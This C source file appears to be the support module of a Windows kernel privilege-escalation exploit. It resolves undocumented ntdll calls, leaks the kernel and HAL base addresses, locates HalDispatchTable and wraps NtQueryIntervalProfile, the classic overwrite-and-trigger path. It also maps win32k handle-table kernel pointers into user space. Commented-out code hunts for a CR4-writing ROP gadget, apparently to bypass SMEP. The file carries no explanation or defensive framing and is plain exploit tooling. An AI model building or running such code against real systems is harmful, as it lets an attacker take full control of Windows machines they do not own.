

#include <windows.h>
#include <Strsafe.h>
#include <Shlwapi.h>
#include "structs.h"

#pragma warning(disable: 4995)

PVOID			g_KernelBase = NULL;
PVOID			g_HalDispatchTable = NULL;
PVOID			g_HalBase = NULL;
PVOID			g_hqsi_addr = NULL;
PSHAREDINFO		g_pSharedInfo;
ULONG_PTR		g_DeltaDesktopHeap;

#ifdef _WIN64
#define PDESKTOPINFO_OFFSET 0x28
#else
#define PDESKTOPINFO_OFFSET 0x1c
#endif


void LogPrint(CHAR * first, ...)
{
	va_list arglist;
	va_start(arglist, first);

	CHAR Tmp[0x80];

	vsprintf_s(Tmp, sizeof(Tmp), first, arglist);

	printf(Tmp);
	OutputDebugStringA(Tmp);
}

_RtlInitUnicodeString g_RtlInitUnicodeString = NULL;

VOID WINAPI RtlInitUnicodeString(
	PUNICODE_STRING DestinationString,
	PCWSTR          SourceString
	)
{
	if(!g_RtlInitUnicodeString)
	{
		g_RtlInitUnicodeString = (_RtlInitUnicodeString)GetProcAddress(
			GetModuleHandleW(L"ntdll.dll"), "RtlInitUnicodeString");
	}

	if (g_RtlInitUnicodeString)
	{
		g_RtlInitUnicodeString(DestinationString, SourceString);
	}
}

_NtQuerySystemInformation g_NtQuerySystemInformation = NULL;

NTSTATUS WINAPI NtQuerySystemInformation(
	SYSTEM_INFORMATION_CLASS SystemInformationClass,
	PVOID SystemInformation,
	ULONG SystemInformationLength,
	PULONG ReturnLength
	)
{
	if(!g_NtQuerySystemInformation)
	{
		g_NtQuerySystemInformation = (_NtQuerySystemInformation)GetProcAddress(
			GetModuleHandleW(L"ntdll.dll"), "NtQuerySystemInformation");
	}

	if (g_NtQuerySystemInformation)
	{
		return g_NtQuerySystemInformation(
			SystemInformationClass,
			SystemInformation,
			SystemInformationLength,
			ReturnLength
			);
	}
	return STATUS_UNSUCCESSFUL;
}

_NtQueryInformationProcess g_NtQueryInformationProcess = NULL;

NTSTATUS WINAPI NtQueryInformationProcess(
	HANDLE ProcessHandle,
	PROCESSINFOCLASS ProcessInformationClass,
	PVOID ProcessInformation,
	ULONG ProcessInformationLength,
	PULONG ReturnLength
	)
{
	if (!g_NtQueryInformationProcess)
	{
		g_NtQueryInformationProcess = (_NtQueryInformationProcess)GetProcAddress(
			GetModuleHandleW(L"ntdll.dll"), 
			"NtQueryInformationProcess");
	}

	if (g_NtQueryInformationProcess) {
		return g_NtQueryInformationProcess( 
			ProcessHandle,
			ProcessInformationClass,
			ProcessInformation,
			ProcessInformationLength,
			ReturnLength);
	}

	return STATUS_UNSUCCESSFUL;
}

_NtQueryIntervalProfile g_NtQueryIntervalProfile = NULL;

NTSTATUS NTAPI NtQueryIntervalProfile(
	UINT ProfileSource,
	PULONG Interval)
{
	if (!g_NtQueryIntervalProfile)
	{
		g_NtQueryIntervalProfile = (_NtQueryIntervalProfile)GetProcAddress(
			GetModuleHandleW(L"ntdll.dll"), 
			"NtQueryIntervalProfile");
	}

	if (g_NtQueryIntervalProfile) {
		return g_NtQueryIntervalProfile( 
			ProfileSource,
			Interval);
	}

	return STATUS_UNSUCCESSFUL;
}

VOID NTAPI
RtlInitLargeUnicodeString(
	IN OUT PLARGE_UNICODE_STRING DestinationString,
	IN PCWSTR SourceString,
	IN INT Unknown,
	IN INT datasize = 0)
{
	ULONG DestSize;

	if (datasize != 0)
	{
		DestSize = datasize;
		DestinationString->Length = DestSize;
		DestinationString->MaximumLength = DestSize + sizeof(WCHAR);
	}
	else if (SourceString)
	{
		DestSize = (ULONG)wcslen(SourceString) * sizeof(WCHAR);
		DestinationString->Length = DestSize;
		DestinationString->MaximumLength = DestSize + sizeof(WCHAR);
	}
	else
	{
		DestinationString->Length = 0;
		DestinationString->MaximumLength = 0;
	}

	DestinationString->Buffer = (PWSTR)SourceString;
	DestinationString->bAnsi  = FALSE;
}

PVOID GetMappedHandlePtr(HANDLE MyHandle, PVOID * UserlandPtr)
{

	HANDLEENTRY * UserHandleTable = g_pSharedInfo->aheList;//(HANDLEENTRY *)(*(ULONG_PTR *)((BYTE *)g_pSharedInfo+8));
	ULONG cEntries = g_pSharedInfo->psi->cHandleEntries;//((ULONG *)(g_pSharedInfo->psi))[2];
	ULONG dwIndex = (ULONG)MyHandle & 0xFFFF;
	ULONG dwUniq = (ULONG)MyHandle >> 16;

	if(dwIndex <= cEntries)
	{
		if (dwUniq == UserHandleTable[dwIndex].wUniq)
		{
			*UserlandPtr = (PVOID)((ULONG_PTR)UserHandleTable[dwIndex].phead - g_DeltaDesktopHeap);
			return (PVOID)UserHandleTable[dwIndex].phead;
		}
	}

	return NULL;
}

PVOID GetMappedUserlandPtr(PVOID KernelPtr)
{
	return (PVOID)((ULONG_PTR)KernelPtr - g_DeltaDesktopHeap);
}

FARPROC GetKernelAddress(HMODULE UserKernBase, PVOID RealKernelBase, LPCSTR SymName)
{
	PUCHAR KernBaseTemp     = (PUCHAR) UserKernBase;
	PUCHAR RealKernBaseTemp = (PUCHAR) RealKernelBase;
	PUCHAR temp             = (PUCHAR) GetProcAddress(UserKernBase, SymName);

	if (temp == NULL)
		return NULL;

	return (FARPROC)(temp - KernBaseTemp + RealKernBaseTemp);
}

ULONG_PTR MatachInString( CHAR* raw, ULONG_PTR size, CHAR* ptrn, ULONG ptrn_size )
{
	for (ULONG_PTR i = 0; i < size; i++)
	{
		if (memcmp((CHAR *)&raw[i], ptrn, ptrn_size) == 0)
			return i;
	}

	return -1;
}


PVOID GetKernelOffset( CHAR* libpath, ULONG_PTR libbase, CHAR *ptrn, ULONG ptrn_size )
{
	HANDLE hFile;
	HANDLE hFileMapping;
	LPVOID lpFileBase;
	PIMAGE_DOS_HEADER dosHeader;
	PVOID RetAddr = NULL;

	hFile = CreateFileA(libpath, GENERIC_READ, FILE_SHARE_READ, NULL,
		OPEN_EXISTING, FILE_ATTRIBUTE_NORMAL, 0);

	if (hFile == INVALID_HANDLE_VALUE)
		return RetAddr;

	hFileMapping = CreateFileMappingW(hFile, NULL, PAGE_READONLY, 0, 0, NULL);

	if (hFileMapping == 0)
	{   
		CloseHandle(hFile);
		return RetAddr; 
	}

	lpFileBase = MapViewOfFile(hFileMapping, FILE_MAP_READ, 0, 0, 0);
	if (lpFileBase == 0)
	{
		CloseHandle(hFileMapping);
		CloseHandle(hFile);
		return RetAddr;
	}

	dosHeader = (IMAGE_DOS_HEADER*) lpFileBase;
	if (dosHeader->e_magic != IMAGE_DOS_SIGNATURE)
		goto exit_f;

	ULONG_PTR _nt_header = (ULONG_PTR)lpFileBase + ((PIMAGE_DOS_HEADER)lpFileBase)->e_lfanew;
	ULONG_PTR _section = ((ULONG_PTR) &((PIMAGE_NT_HEADERS)_nt_header)->OptionalHeader + ((PIMAGE_NT_HEADERS)_nt_header)->FileHeader.SizeOfOptionalHeader);

	ULONG_PTR _sec_count = ((PIMAGE_NT_HEADERS)_nt_header)->FileHeader.NumberOfSections;

	while (_sec_count--)
	{
		CHAR* p = (CHAR*)((PIMAGE_SECTION_HEADER)_section)->Name;
		if (((PIMAGE_SECTION_HEADER)_section)->Characteristics & 0x00000020 )
		{			
			ULONG_PTR sec_va = ((PIMAGE_SECTION_HEADER)_section)->VirtualAddress;

			ULONG_PTR rawdata = ( (ULONG_PTR)lpFileBase + ((PIMAGE_SECTION_HEADER)_section)->PointerToRawData );
			ULONG_PTR size = ((PIMAGE_SECTION_HEADER)_section)->SizeOfRawData;

			ULONG_PTR offset = MatachInString((CHAR *)rawdata, size, ptrn, ptrn_size);

			if (offset != -1)
			{
				RetAddr = (PVOID)(libbase + sec_va + offset);
				break;
			}
		}

		_section += sizeof( IMAGE_SECTION_HEADER );
	}

exit_f:
	UnmapViewOfFile(lpFileBase);
	CloseHandle(hFileMapping);
	CloseHandle(hFile);

	return RetAddr;
}

BOOL IsProcess32bit(HANDLE hProcess)
{
	NTSTATUS status;
	PROCESS_EXTENDED_BASIC_INFORMATION pebi;

	if (hProcess == NULL) {
		return FALSE;
	}

	//query if this is wow64 process
	RtlSecureZeroMemory(&pebi, sizeof(pebi));
	pebi.Size = sizeof(PROCESS_EXTENDED_BASIC_INFORMATION);
	status = NtQueryInformationProcess(hProcess, ProcessBasicInformation, &pebi, sizeof(pebi), NULL);
	if (NT_SUCCESS(status)) {
		return (pebi.IsWow64Process == 1);
	}
	return FALSE;
}

BOOL GetKernelInfo()
{
	CHAR kFullName[256];
	LPSTR kName;
	HMODULE KernelHandle;
	PSYSTEM_MODULE_INFORMATION pModuleInfo = NULL;
	ULONG ulLength;
	NTSTATUS Status;


#ifndef _WIN64
	BOOL Is32bit = IsProcess32bit(GetCurrentProcess());
	if (Is32bit)
	{
		LogPrint("cannot run in wow64\n"); 
		return FALSE;
	}
#endif

	Status = NtQuerySystemInformation(SystemModuleInformation, NULL, 0, &ulLength);
	if (STATUS_INSUFFICIENT_RESOURCES != Status) 
	{
		pModuleInfo = (PSYSTEM_MODULE_INFORMATION)malloc(ulLength);
		Status = NtQuerySystemInformation(SystemModuleInformation, pModuleInfo, ulLength, &ulLength);
	}

	if (STATUS_SUCCESS != Status)
	{
		return FALSE;
	}

	for (ULONG i = 0; i < pModuleInfo->Count; i++)
	{	
		memset(kFullName, 0, sizeof(kFullName));
		strcpy_s(kFullName, sizeof(kFullName)-1, pModuleInfo->Module[i].ImageName);

		if ( strstr( kFullName, "ntoskrnl" ) || strstr( kFullName, "ntkrnlpa" ) || strstr( kFullName, "ntkrnlmp" ) )
		{
			g_KernelBase = pModuleInfo->Module[i].Base;
			kName = strrchr(kFullName, '\\');
			KernelHandle = LoadLibraryExA(++kName, NULL, DONT_RESOLVE_DLL_REFERENCES);
		}
		else if ( strstr( kFullName, "hal.dll" ) ||  strstr( kFullName, "halmacpi.dll" ) )
		{
			g_HalBase = pModuleInfo->Module[i].Base;
		}
		if ( g_KernelBase != NULL && g_HalBase != NULL)
			break;
	}

	if (pModuleInfo)
	{
		free(pModuleInfo);
	}

	if ( g_KernelBase == NULL || g_HalBase == NULL)
	{
		LogPrint("get nt or hal baseaddr error\n"); 
		return FALSE;
	}

	if (KernelHandle == NULL) {
		LogPrint("load nt moudule error\n"); 
		return FALSE;
	}

	// find the ROP address that will modify the cr4

//	CHAR FilePath[MAX_PATH];
// 	CHAR ropPtrn[]  = "\x0f\x22\xe0\x48\x83\xc4\x28\xc3";
//	FilePath[0] = 0;
// 	ExpandEnvironmentStringsA("%SystemRoot%\\system32\\ntoskrnl.exe", FilePath, MAX_PATH - 1);
// 	rop_addr = GetKernelOffset(FilePath, (ULONG_PTR)g_KernelBase, ropPtrn, sizeof(ropPtrn) - 1);
// 	if (rop_addr == NULL)
// 	{
// 		LogPrint("get rop_addr error\n"); 
// 		return FALSE;
// 	}

	// find the hal!HaliQuerySystemInformation address

// 	CHAR hqsiPtrn_cn_1[] = //hal.dll 9600.17196 x64
// 		"\x55\x53\x56\x57\x41\x54\x41\x56\x41\x57\x48\x8d\x6c\x24\xc0\x48"
// 		"\x81\xec\x40\x01\x00\x00\x48\x8b\x05\xc3\x7c\xfe\xff\x48\x33\xc4"
// 		"\x48\x89\x45\x30\x33\xdb\x4d\x8b\xf9\x4d\x8b\xe0\x8b\xf2\xc6\x44"
// 		"\x24\x20\x00\x4d\x85\xc9\x74\x03\x41\x21\x19\x33\xff\x45\x33\xf6"
// 		"\x83\xf9\x19\x0f\x8f\xd8\x00\x00\x00\x41\x8d\x7e\x0c\x74\x65\x3b";
// 
// 	FilePath[0] = 0;
// 	ExpandEnvironmentStringsA("%SystemRoot%\\system32\\hal.dll", FilePath, MAX_PATH - 1);
// 	g_HaliQuerySystemInformation = GetKernelOffset( FilePath, (ULONG_PTR) g_HalBase, hqsiPtrn_cn_1, sizeof(hqsiPtrn_cn_1) - 1);
// 	if (g_HaliQuerySystemInformation == NULL)
// 	{
// 		LogPrint("get HaliQuerySystemInformation addr error\n"); 
// 		return FALSE;
// 	}

	// find the HalDispatchTable address
	g_HalDispatchTable = (PVOID)GetKernelAddress(KernelHandle, g_KernelBase, "HalDispatchTable");
	if (!g_HalDispatchTable){
		LogPrint("get HalDispatchTable addr error\n"); 
		return FALSE;
	}


	_TEB64 * Teb = (_TEB64*)NtCurrentTeb();
	g_DeltaDesktopHeap = *(ULONG_PTR *)((BYTE *)(Teb->Win32ClientInfo) + PDESKTOPINFO_OFFSET);

	g_pSharedInfo = (PSHAREDINFO)GetProcAddress(GetModuleHandleA("USER32.dll"), "gSharedInfo");

	if (!g_pSharedInfo){
		LogPrint("get gSharedInfo addr error\n"); 
		return FALSE;
	}

	LogPrint("g_KernelBase       : %p\n", g_KernelBase); 
	LogPrint("g_HalBase          : %p\n", g_HalBase); 
	LogPrint("g_HalDispatchTable : %p\n", g_HalDispatchTable); 
	LogPrint("g_DeltaDesktopHeap : %p\n", g_DeltaDesktopHeap); 
	LogPrint("g_pSharedInfo      : %p\n", g_pSharedInfo); 

	return TRUE;
}